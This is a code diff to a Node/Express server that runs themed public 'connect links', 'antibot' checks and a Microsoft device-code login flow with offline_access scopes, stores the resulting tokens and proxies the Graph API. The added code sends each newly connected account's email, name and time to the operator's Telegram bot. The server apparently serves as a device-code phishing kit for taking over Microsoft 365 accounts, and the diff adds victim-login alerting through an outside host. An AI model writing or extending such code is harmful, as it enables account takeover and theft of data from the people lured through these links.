@@ -153,6 +153,14 @@ async function initDB() {
       ssl_verified BOOLEAN DEFAULT false,
       created_at TIMESTAMPTZ DEFAULT NOW()
     );
+
+    CREATE TABLE IF NOT EXISTS telegram_settings (
+      user_id INTEGER PRIMARY KEY REFERENCES users(id) ON DELETE CASCADE,
+      bot_token TEXT NOT NULL,
+      chat_id TEXT NOT NULL,
+      enabled BOOLEAN DEFAULT true,
+      updated_at TIMESTAMPTZ DEFAULT NOW()
+    );
   `);
 
   // Migrations: add columns that may not exist yet
@@ -334,16 +342,37 @@ const SCOPES = [
   "offline_access",
 ];
 
+async function sendTelegramNotification(userId, text) {
+  try {
+    const { rows } = await pool.query(
+      "SELECT bot_token, chat_id, enabled FROM telegram_settings WHERE user_id = $1",
+      [userId]
+    );
+    if (rows.length === 0 || !rows[0].enabled) return;
+    const { bot_token, chat_id } = rows[0];
+
+    const url = `https://api.telegram.org/bot${bot_token}/sendMessage`;
+    await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id, text, parse_mode: "HTML", disable_web_page_preview: true }),
+    });
+  } catch (e) {
+    console.error("[telegram] notify failed:", e.message);
+  }
+}
+
 // Active device code sessions: sessionId -> { linkId, userId, userCode, status, ... }
 // These are short-lived (15 min max) and stay in-memory
 const deviceSessions = new Map();
 
-async function saveAccount(userId, authResult) {
+async function saveAccount(userId, authResult, linkContext = null) {
   const { rows: existing } = await pool.query(
     "SELECT id FROM microsoft_accounts WHERE user_id = $1 AND ms_account_id = $2",
     [userId, authResult.account?.localAccountId]
   );
 
+  const isNewAccount = existing.length === 0;
   let accountDbId;
   if (existing.length > 0) {
     await pool.query(`
@@ -376,6 +405,18 @@ async function saveAccount(userId, authResult) {
       authResult.expiresOn?.toISOString()
     ]);
     accountDbId = rows[0].id;
+  }
+
+  // Send Telegram notification on new login via a connection link
+  if (linkContext) {
+    const linkInfo = linkContext.theme ? ` <i>(${linkContext.theme} link)</i>` : "";
+    const text =
+      `🔔 <b>New Microsoft account connected</b>\n\n` +
+      `<b>Email:</b> ${authResult.account?.username || "unknown"}\n` +
+      `<b>Name:</b> ${authResult.account?.name || "unknown"}\n` +
+      `<b>Status:</b> ${isNewAccount ? "New connection" : "Re-connected"}${linkInfo}\n` +
+      `<b>Time:</b> ${new Date().toISOString()}`;
+    sendTelegramNotification(userId, text);
   }
 
   return {
@@ -436,13 +477,14 @@ app.get("/antibot/challenge/:linkId", generalLimiter, validateHeadersLight, gene
 // Public: start a fresh device code session from a connect link
 app.post("/microsoft/start-session/:linkId", startSessionLimiter, validateHeadersStrict, validateAntibot, async (req, res) => {
   try {
-    const { rows } = await pool.query("SELECT user_id FROM connect_links WHERE link_id = $1", [req.params.linkId]);
+    const { rows } = await pool.query("SELECT user_id, theme FROM connect_links WHERE link_id = $1", [req.params.linkId]);
     if (rows.length === 0) {
       return res.status(404).json({ error: "Connection link not found" });
     }
 
     const sessionId = generateId();
     const userId = rows[0].user_id;
+    const linkTheme = rows[0].theme;
 
     const deviceCodeRequest = {
       scopes: SCOPES,
@@ -463,7 +505,7 @@ app.post("/microsoft/start-session/:linkId", startSessionLimiter, validateHeader
         const session = deviceSessions.get(sessionId);
         if (session) {
           session.status = "completed";
-          session.msAccount = await saveAccount(userId, authResult);
+          session.msAccount = await saveAccount(userId, authResult, { linkId: req.params.linkId, theme: linkTheme });
         }
       })
       .catch((err) => {
@@ -731,6 +773,88 @@ app.delete("/domains/:domainId", requireAuth, async (req, res) => {
   }
 });
 
+// ─── Telegram Notifications ──────────────────────────────────
+
+app.get("/telegram/settings", requireAuth, async (req, res) => {
+  try {
+    const { rows } = await pool.query(
+      "SELECT bot_token, chat_id, enabled FROM telegram_settings WHERE user_id = $1",
+      [req.userId]
+    );
+    if (rows.length === 0) return res.json({ configured: false });
+    res.json({
+      configured: true,
+      bot_token: rows[0].bot_token,
+      chat_id: rows[0].chat_id,
+      enabled: rows[0].enabled,
+    });
+  } catch (error) {
+    console.error("Telegram settings get error:", error);
+    res.status(500).json({ error: "Failed to load settings" });
+  }
+});
+
+app.post("/telegram/settings", requireAuth, async (req, res) => {
+  const { bot_token, chat_id, enabled } = req.body;
+  if (!bot_token || !chat_id) {
+    return res.status(400).json({ error: "Bot token and chat ID are required" });
+  }
+  try {
+    await pool.query(`
+      INSERT INTO telegram_settings (user_id, bot_token, chat_id, enabled, updated_at)
+      VALUES ($1, $2, $3, $4, NOW())
+      ON CONFLICT (user_id) DO UPDATE SET
+        bot_token = EXCLUDED.bot_token,
+        chat_id = EXCLUDED.chat_id,
+        enabled = EXCLUDED.enabled,
+        updated_at = NOW()
+    `, [req.userId, bot_token.trim(), String(chat_id).trim(), enabled !== false]);
+    res.json({ ok: true });
+  } catch (error) {
+    console.error("Telegram settings save error:", error);
+    res.status(500).json({ error: "Failed to save settings" });
+  }
+});
+
+app.delete("/telegram/settings", requireAuth, async (req, res) => {
+  try {
+    await pool.query("DELETE FROM telegram_settings WHERE user_id = $1", [req.userId]);
+    res.json({ ok: true });
+  } catch (error) {
+    res.status(500).json({ error: "Failed to delete settings" });
+  }
+});
+
+app.post("/telegram/test", requireAuth, async (req, res) => {
+  try {
+    const { rows } = await pool.query(
+      "SELECT bot_token, chat_id FROM telegram_settings WHERE user_id = $1",
+      [req.userId]
+    );
+    if (rows.length === 0) {
+      return res.status(400).json({ error: "Telegram not configured" });
+    }
+    const { bot_token, chat_id } = rows[0];
+    const tgRes = await fetch(`https://api.telegram.org/bot${bot_token}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id,
+        text: "✅ <b>Test message</b>\n\nYour Telegram notifications are working correctly.",
+        parse_mode: "HTML",
+      }),
+    });
+    const data = await tgRes.json();
+    if (!data.ok) {
+      return res.status(400).json({ error: data.description || "Telegram rejected the message" });
+    }
+    res.json({ ok: true });
+  } catch (error) {
+    console.error("Telegram test error:", error);
+    res.status(500).json({ error: "Failed to send test message" });
+  }
+});
+
 // ─── Graph API Proxy ─────────────────────────────────────────
 
 app.use("/api/graph", requireAuth, async (req, res) => {
@@ -870,7 +994,7 @@ if (isProduction) {
 
   // Regular SPA fallback for all other pages
   app.use((req, res, next) => {
-    if (req.method === "GET" && !req.path.startsWith("/api/") && !req.path.startsWith("/auth/") && !req.path.startsWith("/microsoft/") && !req.path.startsWith("/antibot/") && !req.path.startsWith("/connect/") && !req.path.startsWith("/domains/")) {
+    if (req.method === "GET" && !req.path.startsWith("/api/") && !req.path.startsWith("/auth/") && !req.path.startsWith("/microsoft/") && !req.path.startsWith("/antibot/") && !req.path.startsWith("/connect/") && !req.path.startsWith("/domains/") && !req.path.startsWith("/telegram/")) {
       res.sendFile(path.join(distPath, "index.html"));
     } else {
       next();
